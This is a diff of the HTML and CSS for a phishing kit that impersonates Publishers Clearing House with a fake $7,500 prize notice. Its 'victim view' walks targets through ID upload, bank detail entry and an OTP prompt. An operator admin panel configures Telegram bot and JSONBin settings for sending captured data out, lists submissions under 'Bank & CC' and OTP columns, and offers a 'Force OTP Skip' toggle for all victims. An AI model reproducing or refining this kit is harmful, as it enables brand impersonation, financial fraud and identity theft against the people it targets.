@@ -2,163 +2,174 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title id="page-title">Publishers Clearing House - Official Prize Notification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="description" content="Official Prize Notification">
+    <title>PCH - Official Prize Notification</title>
     <style>
+        /* --- CSS RESET & VARIABLES --- */
         :root {
             --pch-red: #E31841;
-            --pch-primary: #F2C94C; 
-            --pch-black: #231F20;
-            --pch-gray: #F9F9F9;
+            --pch-gold: #F2C94C; 
+            --pch-black: #1A1A1A;
+            --pch-white: #FFFFFF;
+            --pch-gray: #F4F4F4;
             --pch-border: #E0E0E0;
-            --font-header: 'Century Gothic', CenturyGothic, AppleGothic, sans-serif;
-            --font-body: Arial, Helvetica, sans-serif;
-            --admin-gold: #FFD700;
-            --admin-black: #1a1a1a;
-            --admin-dark-gray: #2d2d2d;
+            --pch-text: #2C3E50;
+            --font-heading: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            --font-body: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            
+            /* Admin Colors */
+            --adm-bg: #121212;
+            --adm-card: #1E1E1E;
+            --adm-gold: #FFD700;
+            --adm-text: #E0E0E0;
+            --adm-accent: #3498DB;
         }
-        
-        * { box-sizing: border-box; }
+
+        * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
         
         body { 
             font-family: var(--font-body); 
             background: var(--pch-gray); 
             margin: 0; 
             padding: 0; 
-            color: var(--pch-black);
+            color: var(--pch-text);
             min-height: 100vh;
             display: flex;
             flex-direction: column;
+            overflow-x: hidden;
         }
 
-        .pch-header {
+        /* --- ANTI-BOT / LOADING OVERLAY --- */
+        #anti-bot-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
             background: white;
-            padding: 15px;
-            text-align: center;
-            border-bottom: 4px solid var(--pch-primary);
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            z-index: 9999;
             display: flex;
             justify-content: center;
             align-items: center;
+            flex-direction: column;
+            transition: opacity 0.5s ease;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--pch-red);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* --- VICTIM VIEW STYLES --- */
+        .pch-header {
+            background: var(--pch-white);
+            padding: 15px;
+            text-align: center;
+            border-bottom: 1px solid var(--pch-border);
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
         }
         
-        .pch-logo-container {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            width: 100%;
-            max-width: 450px;
-            height: auto;
+        .pch-logo {
+            font-family: var(--font-heading);
+            font-weight: 900;
+            color: var(--pch-gold);
+            font-size: 32px;
+            letter-spacing: -1px;
+            display: inline-block;
         }
-        
-        .pch-logo-svg {
-            height: 60px;
-            width: 100%;
-            max-width: 400px;
-            fill: var(--pch-primary); 
-        }
-        
+        .pch-logo span { color: var(--pch-black); font-weight: 400; font-size: 18px; margin-left: 5px; }
+
         .main-container { 
             flex: 1;
             display: flex;
             justify-content: center;
-            align-items: flex-start;
-            padding: 30px 15px;
+            padding: 20px 15px 40px 15px;
         }
         
         .card { 
             width: 100%;
-            max-width: 600px; 
-            background: white; 
-            border-radius: 6px; 
-            box-shadow: 0 5px 25px rgba(0,0,0,0.1); 
-            border: 1px solid var(--pch-border);
+            max-width: 550px; 
+            background: var(--pch-white); 
+            border-radius: 12px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08); 
             overflow: hidden;
+            border: 1px solid rgba(0,0,0,0.05);
         }
         
         .card-header {
-            background: white;
-            padding: 30px 25px;
+            background: var(--pch-white);
+            padding: 35px 30px 20px 30px;
             text-align: center;
-            border-bottom: 2px solid var(--pch-primary);
+            border-bottom: 3px solid var(--pch-gold);
         }
         .card-header h1 {
-            font-family: var(--font-header);
+            font-family: var(--font-heading);
             margin: 0;
-            font-size: 28px;
-            font-weight: 900;
+            font-size: 26px;
+            font-weight: 800;
             color: var(--pch-black);
-            line-height: 1.2;
+            line-height: 1.3;
         }
-        .card-header h1 .highlight {
-            color: var(--pch-red);
-        }
+        .card-header h1 .highlight { color: var(--pch-red); }
         .card-header p {
-            margin: 15px 0 0 0;
-            color: var(--pch-black);
-            font-size: 16px;
-            font-weight: bold;
+            margin: 10px 0 0 0;
+            color: #666;
+            font-size: 15px;
+            font-weight: 500;
         }
 
-        .card-body {
-            padding: 30px;
-        }
+        .card-body { padding: 30px; }
         
-        .progress-container {
-            margin-bottom: 35px;
-        }
+        .progress-container { margin-bottom: 30px; }
         .progress-bar-bg {
             width: 100%;
-            height: 4px;
+            height: 6px;
             background: #EEE;
-            border-radius: 2px;
+            border-radius: 3px;
             overflow: hidden;
         }
         .progress-bar-fill {
             height: 100%;
             background: var(--pch-red);
-            width: 10%;
-            transition: width 0.4s ease;
+            width: 0%;
+            transition: width 0.5s ease;
         }
         .progress-text {
-            text-align: center;
+            text-align: right;
             font-size: 11px;
             color: #888;
-            margin-top: 10px;
-            font-family: var(--font-header);
+            margin-top: 6px;
+            font-weight: 600;
             text-transform: uppercase;
-            letter-spacing: 1px;
-            font-weight: 700;
+            letter-spacing: 0.5px;
         }
 
         .form-group { margin-bottom: 20px; }
         label { 
             display: block; 
             margin-bottom: 8px; 
-            font-weight: bold; 
-            font-size: 14px; 
+            font-weight: 600; 
+            font-size: 13px; 
             color: var(--pch-black);
-            font-family: var(--font-header);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
-        input[type="text"], 
-        input[type="email"], 
-        input[type="password"], 
-        input[type="number"],
-        input[type="date"],
-        input[type="tel"],
-        select, textarea { 
+        input, select { 
             width: 100%; 
-            padding: 14px 15px; 
+            padding: 14px 16px; 
             border: 1px solid #DDD; 
-            border-radius: 4px; 
-            box-sizing: border-box; 
+            border-radius: 8px; 
             font-size: 16px;
             background: #FAFAFA;
             transition: all 0.2s;
+            font-family: var(--font-body);
         }
-        input:focus, textarea:focus {
+        input:focus, select:focus {
             border-color: var(--pch-red);
-            outline: none;
             background: white;
             box-shadow: 0 0 0 3px rgba(227, 24, 65, 0.1);
         }
@@ -166,349 +177,332 @@
         .btn-primary { 
             width: 100%; 
             padding: 16px; 
-            background: var(--pch-primary); 
+            background: var(--pch-gold); 
             color: var(--pch-black); 
             border: none; 
-            border-radius: 4px; 
-            font-size: 18px; 
-            font-weight: 800; 
+            border-radius: 8px; 
+            font-size: 16px; 
+            font-weight: 700; 
             cursor: pointer; 
-            margin-top: 15px;
-            font-family: var(--font-header);
+            margin-top: 10px;
+            font-family: var(--font-heading);
             text-transform: uppercase;
+            letter-spacing: 0.5px;
             transition: all 0.2s;
-            box-shadow: 0 3px 6px rgba(0,0,0,0.1);
+            box-shadow: 0 4px 10px rgba(242, 201, 76, 0.3);
         }
         .btn-primary:hover { 
-            filter: brightness(0.95); 
-            transform: translateY(-1px);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(242, 201, 76, 0.4);
         }
+        .btn-primary:active { transform: translateY(0); }
 
         .hidden { display: none !important; }
 
         .id-upload-area {
             border: 2px dashed #DDD;
-            padding: 30px 20px;
+            padding: 25px;
             text-align: center;
-            border-radius: 6px;
-            margin-bottom: 15px;
+            border-radius: 8px;
             cursor: pointer;
             background: #FAFAFA;
             transition: all 0.2s;
         }
-        .id-upload-area:hover { 
-            border-color: var(--pch-red); 
-            background: #FFF5F5; 
-        }
-        .id-upload-text {
-            font-size: 14px;
-            color: #666;
-            font-weight: bold;
-        }
-        .id-preview-img {
-            width: 100%;
-            max-width: 200px;
-            height: auto;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            margin-top: 10px;
-            display: block;
-            margin-left: auto;
-            margin-right: auto;
-        }
+        .id-upload-area:hover { border-color: var(--pch-red); background: #FFF5F5; }
+        .id-upload-text { font-size: 14px; color: #666; font-weight: 600; }
+        .id-preview-img { width: 100%; max-height: 150px; object-fit: cover; border-radius: 6px; margin-top: 10px; }
 
         .error-message {
             background: #FFF0F0;
             color: var(--pch-red);
             padding: 12px;
-            border-radius: 4px;
+            border-radius: 6px;
             margin-bottom: 20px;
             text-align: center;
-            font-weight: bold;
-            border: 1px solid var(--pch-red);
+            font-weight: 600;
+            font-size: 14px;
             display: none;
+            border: 1px solid rgba(227, 24, 65, 0.2);
         }
 
         .footer { 
             text-align: center; 
             font-size: 12px; 
             color: #888; 
-            padding: 40px 20px; 
-            background: white;
+            padding: 30px 20px; 
+            background: var(--pch-white);
             border-top: 1px solid #EEE;
         }
-        .footer a { color: var(--pch-red); text-decoration: none; font-weight: bold; cursor: pointer; }
-        .footer .pch-logo-container { transform: scale(0.6); margin-bottom: 15px; }
+        .footer a { color: var(--pch-red); text-decoration: none; font-weight: 600; cursor: pointer; }
 
-        /* ADMIN UI (Black & Gold) */
-        #admin-panel { display: none; max-width: 100%; width: 95%; margin: 20px auto; padding-bottom: 50px; font-family: 'Segoe UI', sans-serif; }
+        /* --- ADMIN UI (SLEEK DARK MODE) --- */
+        #admin-panel { display: none; min-height: 100vh; background: var(--adm-bg); color: var(--adm-text); font-family: var(--font-body); }
         .admin-header { 
-            background: var(--admin-black); 
-            color: var(--admin-gold); 
-            padding: 25px; 
-            border-radius: 12px 12px 0 0;
+            background: var(--adm-card); 
+            padding: 20px 30px; 
+            border-bottom: 1px solid #333;
             display: flex; 
             justify-content: space-between; 
-            align-items: center; 
-            border-bottom: 3px solid var(--admin-gold);
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
-        .admin-body { background: #f4f4f4; padding: 30px; border-radius: 0 0 12px 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
-        .config-box { background: white; padding: 20px; border-radius: 8px; margin-bottom: 25px; border: 1px solid #ddd; box-shadow: 0 2px 5px rgba(0,0,0,0.03); }
-        .admin-section-title { font-size: 16px; font-weight: bold; color: var(--admin-black); margin-bottom: 15px; border-bottom: 2px solid var(--admin-gold); padding-bottom: 8px; text-transform: uppercase; letter-spacing: 1px; }
+        .admin-header h2 { margin: 0; color: var(--adm-gold); font-size: 20px; font-weight: 700; }
+        .admin-body { padding: 30px; max-width: 1200px; margin: 0 auto; }
         
-        table { width: 100%; border-collapse: collapse; font-size: 14px; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
-        th { background: var(--admin-black); color: var(--admin-gold); font-weight: 700; padding: 15px; text-align: left; }
-        td { padding: 15px; border-bottom: 1px solid #EEE; vertical-align: top; }
-        .status-waiting { color: orange; font-weight: bold; }
-        .status-active { color: green; font-weight: bold; }
-        .status-rejected { color: red; font-weight: bold; }
+        .admin-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 20px; }
+        .admin-card { background: var(--adm-card); padding: 25px; border-radius: 12px; border: 1px solid #333; }
+        .admin-card h3 { margin-top: 0; color: var(--adm-gold); font-size: 16px; text-transform: uppercase; letter-spacing: 1px; border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 20px; }
         
-        .btn-admin { padding: 8px 15px; border: none; border-radius: 4px; cursor: pointer; color: white; font-size: 13px; font-weight: bold; margin-right: 5px; transition: opacity 0.2s; }
-        .btn-admin:hover { opacity: 0.8; }
-        .btn-activate { background: #28a745; }
-        .btn-reject { background: #dc3545; }
-        .btn-delete { background: #6c757d; }
-        .btn-save { background: var(--admin-gold); padding: 12px 25px; color: var(--admin-black); border: none; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 14px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        .btn-add { background: var(--admin-black); color: var(--admin-gold); padding: 12px 25px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; margin-bottom: 20px; }
+        .form-row { margin-bottom: 15px; }
+        .form-row label { font-size: 12px; color: #AAA; margin-bottom: 5px; display: block; text-transform: uppercase; }
+        .admin-input { width: 100%; padding: 10px; background: #2A2A2A; border: 1px solid #444; color: white; border-radius: 6px; font-size: 14px; }
+        .admin-input:focus { border-color: var(--adm-gold); }
         
-        .reorder-list { list-style: none; padding: 0; margin: 0; }
-        .reorder-item { background: white; border: 1px solid #ddd; padding: 12px; margin-bottom: 8px; border-radius: 6px; display: flex; justify-content: space-between; align-items: center; }
-        .reorder-controls { display: flex; gap: 5px; }
-        .btn-move { background: var(--admin-black); color: var(--admin-gold); border: none; width: 25px; height: 25px; border-radius: 4px; cursor: pointer; font-weight: bold; display: flex; align-items: center; justify-content: center; }
+        .btn-admin { 
+            padding: 10px 20px; border: none; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 13px; transition: all 0.2s; width: 100%; margin-top: 10px;
+        }
+        .btn-save { background: var(--adm-gold); color: var(--adm-black); }
+        .btn-save:hover { background: #E6C200; }
+        .btn-danger { background: #E31841; color: white; }
+        .btn-success { background: #28a745; color: white; }
+        .btn-secondary { background: #444; color: white; }
+
+        table { width: 100%; border-collapse: collapse; font-size: 13px; }
+        th { text-align: left; color: #AAA; padding: 12px; border-bottom: 1px solid #333; font-weight: 600; }
+        td { padding: 12px; border-bottom: 1px solid #333; vertical-align: top; }
+        tr:hover { background: #252525; }
         
-        .modal { display: none; position: fixed; z-index: 100; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.6); backdrop-filter: blur(2px); }
-        .modal-content { background-color: #fff; margin: 15% auto; padding: 30px; border-radius: 8px; width: 90%; max-width: 600px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
-        .close { color: #aaa; float: right; font-size: 28px; font-weight: bold; cursor: pointer; }
-        .close:hover { color: black; }
+        .status-badge { padding: 4px 8px; border-radius: 4px; font-size: 11px; font-weight: 700; text-transform: uppercase; }
+        .status-waiting { background: rgba(255, 165, 0, 0.2); color: orange; }
+        .status-active { background: rgba(40, 167, 69, 0.2); color: #28a745; }
+        .status-rejected { background: rgba(220, 53, 69, 0.2); color: #dc3545; }
+
+        .toggle-switch { position: relative; display: inline-block; width: 50px; height: 24px; }
+        .toggle-switch input { opacity: 0; width: 0; height: 0; }
+        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #444; transition: .4s; border-radius: 34px; }
+        .slider:before { position: absolute; content: ""; height: 18px; width: 18px; left: 3px; bottom: 3px; background-color: white; transition: .4s; border-radius: 50%; }
+        input:checked + .slider { background-color: var(--adm-gold); }
+        input:checked + .slider:before { transform: translateX(26px); }
+
+        .page-manager-item { display: flex; justify-content: space-between; align-items: center; padding: 10px; background: #252525; margin-bottom: 8px; border-radius: 6px; }
+        .page-manager-item label { margin: 0; font-size: 14px; cursor: pointer; }
+
+        /* Modal */
+        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.8); backdrop-filter: blur(5px); }
+        .modal-content { background-color: var(--adm-card); margin: 10% auto; padding: 30px; border-radius: 12px; width: 90%; max-width: 500px; border: 1px solid #444; }
+        .close { color: #AAA; float: right; font-size: 28px; font-weight: bold; cursor: pointer; }
+        .close:hover { color: white; }
 
         .success-screen, .otp-screen { text-align: center; padding: 40px 20px; }
-        .success-icon { width: 80px; height: 80px; background: var(--pch-red); border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 40px; color: white; margin-bottom: 20px; box-shadow: 0 4px 15px rgba(227, 24, 65, 0.3); }
-        .error-icon { width: 80px; height: 80px; background: #dc3545; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 40px; color: white; margin-bottom: 20px; }
-        .otp-display { font-size: 32px; font-weight: bold; color: var(--pch-black); background: #F4F4F4; padding: 15px; border-radius: 6px; display: inline-block; margin: 20px 0; letter-spacing: 5px; border: 2px dashed var(--pch-red); }
-        
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--pch-red); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .success-icon { font-size: 50px; color: var(--pch-red); margin-bottom: 20px; }
+        .error-icon { font-size: 50px; color: #dc3545; margin-bottom: 20px; }
+        .otp-display { font-size: 36px; font-weight: bold; color: var(--pch-black); background: #F4F4F4; padding: 15px 30px; border-radius: 8px; display: inline-block; margin: 20px 0; letter-spacing: 5px; border: 2px dashed var(--pch-red); }
     </style>
 </head>
 <body>
 
-    <div class="pch-header">
-        <div class="pch-logo-container">
-            <svg class="pch-logo-svg" viewBox="0 0 600 80" xmlns="http://www.w3.org/2000/svg">
-                <text x="10" y="55" font-family="Century Gothic, sans-serif" font-weight="900" font-size="50" id="svg-logo-text">PCH</text>
-                <text x="140" y="55" font-family="Arial, sans-serif" font-weight="400" font-size="28" id="svg-logo-full-name">Publishers Clearing House</text>
-            </svg>
-        </div>
+    <!-- ANTI-BOT OVERLAY -->
+    <div id="anti-bot-overlay">
+        <div class="spinner"></div>
+        <p style="font-weight: 600; color: #666;">Please Wait...</p>
     </div>
 
     <!-- VICTIM VIEW -->
-    <div class="main-container" id="victim-view">
-        <div class="card">
-            <div class="card-header">
-                <h1 id="page-headline">Congratulations, <span class="highlight" id="display-winner-name">Winner</span>!</h1>
-                <p id="page-subtitle">You are a verified winner of the <span id="display-prize-amount">$7,500</span> Weekly Cash Prize.</p>
-            </div>
-            <div class="card-body">
-                
-                <div class="progress-container">
-                    <div class="progress-bar-bg">
-                        <div class="progress-bar-fill" id="progress-fill"></div>
-                    </div>
-                    <div class="progress-text" id="progress-text">Step 1 of 10</div>
+    <div id="victim-view" class="hidden">
+        <div class="pch-header">
+            <div class="pch-logo" id="header-logo">PCH <span id="header-sub">Publishers Clearing House</span></div>
+        </div>
+
+        <div class="main-container">
+            <div class="card">
+                <div class="card-header">
+                    <h1 id="page-headline">Congratulations, <span class="highlight" id="display-winner-name">Winner</span>!</h1>
+                    <p id="page-subtitle">You are a verified winner of the <span id="display-prize-amount">$7,500</span> Weekly Cash Prize.</p>
                 </div>
+                <div class="card-body">
+                    <div id="error-container" class="error-message"></div>
 
-                <div id="error-container" class="error-message"></div>
-
-                <form id="pch-form" onsubmit="return false;">
-                    
-                    <!-- Dynamic Steps Container -->
-                    <div id="steps-container">
-                        <!-- Steps are injected here via JS based on Config -->
-                    </div>
-                    
-                    <!-- OTP Waiting Screen -->
-                    <div id="verifying-screen" class="hidden success-screen">
-                        <div class="spinner"></div>
-                        <h2 style="color: var(--pch-black);">Verifying Your Code...</h2>
-                        <p>Please wait while we confirm your details with the bank.</p>
-                    </div>
-
-                    <!-- OTP Input Screen -->
-                    <div id="otp-input-screen" class="hidden success-screen">
-                        <div class="error-icon">🔐</div>
-                        <h2 id="otp-page-title">Enter Verification Code</h2>
-                        <p id="otp-page-message">A 6-digit code has been generated for you.</p>
-                        <div class="otp-display" id="generated-otp-display">000000</div>
-                        <div class="form-group">
-                            <label id="otp-label">Type the code above:</label>
-                            <input type="text" id="otp-code-input" required placeholder="000000" style="text-align: center; font-size: 24px; letter-spacing: 5px;">
+                    <div class="progress-container">
+                        <div class="progress-bar-bg">
+                            <div class="progress-bar-fill" id="progress-fill"></div>
                         </div>
-                        <button class="btn-primary" id="otp-submit-btn" onclick="submitOtp()">Verify Code</button>
+                        <div class="progress-text" id="progress-text">Step 1 of 10</div>
                     </div>
 
-                    <!-- Final Success Screen -->
-                    <div id="otp-success" class="hidden success-screen">
-                        <div class="success-icon">✓</div>
-                        <h2 id="success-title" style="color: var(--pch-black);">Successfully Verified!</h2>
-                        <p id="success-message" style="font-size: 18px;">Congratulations! You have been successfully verified.</p>
-                        <p><small id="success-submessage">Your prize will be deposited within 24 hours.</small></p>
-                        <button id="success-button" class="btn-primary" onclick="location.reload()">Finish</button>
-                    </div>
-                </form>
+                    <form id="pch-form" onsubmit="return false;">
+                        <div id="steps-container">
+                            <!-- Steps injected via JS -->
+                        </div>
+                        
+                        <div id="verifying-screen" class="hidden success-screen">
+                            <div class="spinner" style="border-top-color: var(--pch-gold);"></div>
+                            <h2 style="color: var(--pch-black);">Verifying Details...</h2>
+                            <p>Please wait while we confirm your bank information.</p>
+                        </div>
+
+                        <div id="otp-input-screen" class="hidden success-screen">
+                            <div class="error-icon">🔐</div>
+                            <h2 id="otp-page-title">Enter Verification Code</h2>
+                            <p id="otp-page-message">A 6-digit code has been generated for you.</p>
+                            <div class="otp-display" id="generated-otp-display">000000</div>
+                            <div class="form-group">
+                                <label id="otp-label">Type the code above:</label>
+                                <input type="text" id="otp-code-input" required placeholder="000000" style="text-align: center; font-size: 24px; letter-spacing: 5px;">
+                            </div>
+                            <button class="btn-primary" id="otp-submit-btn" onclick="submitOtp()">Verify Code</button>
+                        </div>
+
+                        <div id="otp-success" class="hidden success-screen">
+                            <div class="success-icon">✓</div>
+                            <h2 id="success-title" style="color: var(--pch-black);">Successfully Verified!</h2>
+                            <p id="success-message" style="font-size: 18px;">Congratulations! You have been successfully verified.</p>
+                            <p><small id="success-submessage">Your prize will be deposited within 24 hours.</small></p>
+                            <button id="success-button" class="btn-primary" onclick="location.reload()">Finish</button>
+                        </div>
+                    </form>
+                </div>
             </div>
+        </div>
+
+        <div class="footer">
+            <p>&copy; 2026 <span id="footer-site-name">Publishers Clearing House</span>. All Rights Reserved.</p>
+            <p><a onclick="openTerms()">Terms & Conditions</a> | <a onclick="openTerms()">Privacy Policy</a></p>
         </div>
     </div>
 
     <!-- ADMIN VIEW -->
     <div id="admin-panel">
         <div class="admin-header">
-            <h2 style="margin: 0; font-size: 24px;">PCH Cloud Admin</h2>
-            <button onclick="logoutAdmin()" style="background: var(--admin-gold); color: var(--admin-black); border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-weight: bold;">Exit Admin</button>
+            <h2>PCH Cloud Admin</h2>
+            <button onclick="logoutAdmin()" class="btn-secondary" style="width: auto; padding: 8px 16px; margin: 0;">Exit Admin</button>
         </div>
         <div class="admin-body">
             
-            <!-- Cloud Sync Config -->
-            <div class="config-box" style="border: 2px solid var(--admin-gold);">
-                <div class="admin-section-title">Cloud Sync Settings (JSONBin.io)</div>
-                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px;">
-                    <div>
-                        <label style="font-size: 12px; color: #666;">JSONBin API Key</label>
-                        <input type="text" id="admin-jsonbin-key" placeholder="Enter your API Key">
+            <div class="admin-grid">
+                <!-- Cloud & Telegram Config -->
+                <div class="admin-card">
+                    <h3>Cloud & Notifications</h3>
+                    <div class="form-row">
+                        <label>JSONBin API Key</label>
+                        <input type="text" id="admin-jsonbin-key" class="admin-input" placeholder="Enter API Key">
                     </div>
-                    <div>
-                        <label style="font-size: 12px; color: #666;">JSONBin ID</label>
-                        <input type="text" id="admin-jsonbin-id" placeholder="Enter your Bin ID">
+                    <div class="form-row">
+                        <label>JSONBin ID</label>
+                        <input type="text" id="admin-jsonbin-id" class="admin-input" placeholder="Enter Bin ID">
                     </div>
+                    <div class="form-row">
+                        <label>Telegram Bot Token</label>
+                        <input type="text" id="admin-bot-token" class="admin-input" placeholder="123456:ABCdef...">
+                    </div>
+                    <div class="form-row">
+                        <label>Telegram Chat ID</label>
+                        <input type="text" id="admin-chat-id" class="admin-input" placeholder="1234567890">
+                    </div>
+                    <button class="btn-admin btn-save" onclick="saveCloudAndTelegram()">Save & Sync Cloud</button>
                 </div>
-                <button class="btn-save" onclick="saveCloudConfig()" style="margin-top: 15px; width: 100%;">Save & Sync Cloud</button>
-                <p style="font-size: 12px; color: #666; margin-top: 10px;">* Saving this will push all current data to the cloud.</p>
+
+                <!-- Global Settings -->
+                <div class="admin-card">
+                    <h3>Global Settings</h3>
+                    <div class="form-row">
+                        <label>Winner Name</label>
+                        <input type="text" id="admin-winner-name" class="admin-input" placeholder="John Doe">
+                    </div>
+                    <div class="form-row">
+                        <label>Prize Amount</label>
+                        <input type="text" id="admin-prize-amount" class="admin-input" placeholder="$7,500">
+                    </div>
+                    <div class="form-row">
+                        <label>Headline Text</label>
+                        <input type="text" id="admin-headline" class="admin-input" placeholder="Congratulations, [Name]!">
+                    </div>
+                    <div class="form-row">
+                        <label>Site Name</label>
+                        <input type="text" id="admin-site-name" class="admin-input" placeholder="Publishers Clearing House">
+                    </div>
+                    <div class="form-row">
+                        <label>Primary Color</label>
+                        <input type="color" id="admin-primary-color" class="admin-input" value="#F2C94C" style="height: 40px; padding: 0;">
+                    </div>
+                    <button class="btn-admin btn-save" onclick="saveGlobalConfig()">Save Global Settings</button>
+                </div>
+
+                <!-- OTP & Success Page Editor -->
+                <div class="admin-card">
+                    <h3>Edit OTP & Success Pages</h3>
+                    <div class="form-row">
+                        <label>OTP Page Title</label>
+                        <input type="text" id="admin-otp-title" class="admin-input">
+                    </div>
+                    <div class="form-row">
+                        <label>OTP Page Message</label>
+                        <textarea id="admin-otp-message" class="admin-input" rows="2"></textarea>
+                    </div>
+                    <div class="form-row">
+                        <label>OTP Button Text</label>
+                        <input type="text" id="admin-otp-button" class="admin-input">
+                    </div>
+                    <div class="form-row">
+                        <label>Success Page Title</label>
+                        <input type="text" id="admin-success-title" class="admin-input">
+                    </div>
+                    <div class="form-row">
+                        <label>Success Page Message</label>
+                        <textarea id="admin-success-message" class="admin-input" rows="2"></textarea>
+                    </div>
+                    <div class="form-row">
+                        <label>Success Sub-Message</label>
+                        <textarea id="admin-success-submessage" class="admin-input" rows="2"></textarea>
+                    </div>
+                    <div class="form-row">
+                        <label>Success Button Text</label>
+                        <input type="text" id="admin-success-button" class="admin-input">
+                    </div>
+                    <button class="btn-admin btn-save" onclick="savePageContent()">Save Page Content</button>
+                </div>
+
+                <!-- Page Management -->
+                <div class="admin-card">
+                    <h3>Manage Pages (Hide/Show)</h3>
+                    <div id="page-management-list">
+                        <!-- Injected via JS -->
+                    </div>
+                    <button class="btn-admin btn-save" onclick="savePageManagement()">Save Page Visibility</button>
+                </div>
+
+                <!-- Force OTP Skip -->
+                <div class="admin-card" style="border-color: var(--adm-gold);">
+                    <h3>OTP Gate Control</h3>
+                    <div class="form-row">
+                        <label style="display: flex; align-items: center; gap: 10px;">
+                            <span>Force OTP Skip (Bypass for all victims)</span>
+                            <label class="toggle-switch">
+                                <input type="checkbox" id="admin-force-skip-otp" onchange="toggleForceSkip()">
+                                <span class="slider"></span>
+                            </label>
+                        </label>
+                    </div>
+                    <p style="font-size: 12px; color: #888; margin-top: 5px;">When ON, victims will go straight to Success after the last form field.</p>
+                </div>
             </div>
 
-            <!-- Telegram Config -->
-            <div class="config-box">
-                <div class="admin-section-title">Telegram Notifications</div>
-                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
-                    <div>
-                        <label style="font-size: 12px; color: #666;">Bot Token</label>
-                        <input type="text" id="admin-bot-token" placeholder="123456789:ABCdef...">
-                    </div>
-                    <div>
-                        <label style="font-size: 12px; color: #666;">Chat ID</label>
-                        <input type="text" id="admin-chat-id" placeholder="1234567890">
-                    </div>
-                </div>
-                <button class="btn-save" onclick="saveTelegramConfig()" style="margin-top: 15px; width: 100%;">Save Telegram Settings</button>
+            <div class="admin-card" style="margin-top: 20px;">
+                <h3>Recent Submissions</h3>
+                <table id="submissions-table">
+                    <thead>
+                        <tr>
+                            <th>Time & IP</th>
+                            <th>Personal Info</th>
+                            <th>Bank & CC</th>
+                            <th>OTP & Status</th>
+                            <th>Action</th>
+                        </tr>
+                    </thead>
+                    <tbody id="table-body"></tbody>
+                </table>
             </div>
-
-            <!-- Global Settings -->
-            <div class="config-box">
-                <div class="admin-section-title">Global Settings</div>
-                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px;">
-                    <div>
-                        <label style="font-size: 12px; color: #666;">Winner Name</label>
-                        <input type="text" id="admin-winner-name" placeholder="John Doe">
-                    </div>
-                    <div>
-                        <label style="font-size: 12px; color: #666;">Prize Amount</label>
-                        <input type="text" id="admin-prize-amount" placeholder="$7,500">
-                    </div>
-                    <div>
-                        <label style="font-size: 12px; color: #666;">Headline Text</label>
-                        <input type="text" id="admin-headline" placeholder="Congratulations, [Name]!">
-                    </div>
-                    <div>
-                        <label style="font-size: 12px; color: #666;">OTP Length</label>
-                        <input type="number" id="admin-otp-length" value="6" min="4" max="8">
-                    </div>
-                </div>
-                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-top: 15px;">
-                    <div>
-                        <label style="font-size: 12px; color: #666;">Site Name (Logo)</label>
-                        <input type="text" id="admin-site-name" placeholder="Publishers Clearing House">
-                    </div>
-                    <div>
-                        <label style="font-size: 12px; color: #666;">Primary Color</label>
-                        <input type="color" id="admin-primary-color" value="#F2C94C" style="width: 100%; height: 40px; border: none; cursor: pointer; border-radius: 4px;">
-                    </div>
-                </div>
-                <button class="btn-save" onclick="saveGlobalConfig()" style="margin-top: 20px; width: 100%;">Save Global Settings</button>
-            </div>
-
-            <!-- Success Page Editor -->
-            <div class="config-box">
-                <div class="admin-section-title">Edit "Successfully Verified" Page</div>
-                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
-                    <div>
-                        <label style="font-size: 12px; color: #666;">Title</label>
-                        <input type="text" id="admin-success-title" placeholder="Successfully Verified!">
-                    </div>
-                    <div>
-                        <label style="font-size: 12px; color: #666;">Button Text</label>
-                        <input type="text" id="admin-success-button" placeholder="Finish">
-                    </div>
-                </div>
